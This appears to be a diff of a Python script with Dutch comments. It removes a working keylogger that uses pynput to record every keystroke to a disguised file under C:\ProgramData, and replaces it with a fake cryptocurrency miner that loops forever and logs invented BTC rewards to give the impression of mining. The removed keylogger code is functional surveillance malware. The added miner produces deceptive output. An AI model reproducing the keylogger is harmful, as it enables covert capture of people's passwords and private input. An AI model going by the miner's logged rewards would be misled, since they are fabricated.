@@ -1,27 +1,33 @@
-from pynput import keyboard
+import time
+import random
 import datetime
 import os
+import hashlib
 
-LOG_FILE = "C:\\ProgramData\\windows_log.txt"
-STOP_KEY = keyboard.Key.esc
+LOG_FILE = "C:\\ProgramData\\miner_log.txt"
 
-def log_keystroke(key):
+def current_time():
+    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+def log_message(msg):
+    with open(LOG_FILE, "a") as f:
+        f.write(f"[{current_time()}] {msg}\n")
+
+def mine():
+    log_message("Miner gestart. Hashrate: 1250 H/s")
+    while True:
+        nonce = random.randint(0, 10**8)
+        # Simuleer een 'hash berekening' met een fractie van CPU
+        attempt_hash = hashlib.sha256(f"block_{nonce}".encode()).hexdigest()[:8]
+        log_message(f"[INFO] Hash: {attempt_hash} | Nonce: {nonce}")
+        # Nep reward ~ elke 30-90 pogingen
+        if random.randint(1, 50) == 1:
+            reward = round(random.uniform(0.0001, 0.001), 6)
+            log_message(f"[REWARD] +{reward} BTC ontvangen! Totaal: [GESIMULEERD]")
+        time.sleep(15)   # Laag CPU-gebruik, maar genoeg voor het gevoel
+
+if __name__ == "__main__":
     try:
-        with open(LOG_FILE, "a", encoding="utf-8") as f:
-            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
-            if hasattr(key, 'char') and key.char is not None:
-                f.write(f"[{timestamp}] {key.char}\n")
-            else:
-                special = str(key).replace('Key.', '')
-                f.write(f"[{timestamp}] <{special}>\n")
-    except:
-        pass
-
-def on_release(key):
-    if key == STOP_KEY:
-        print("Keylogger gestopt.")
-        return False
-
-print("Keylogger actief... Druk ESC om te stoppen.")
-with keyboard.Listener(on_press=log_keystroke, on_release=on_release) as listener:
-    listener.join()
+        mine()
+    except Exception as e:
+        log_message(f"FOUT: {e}")
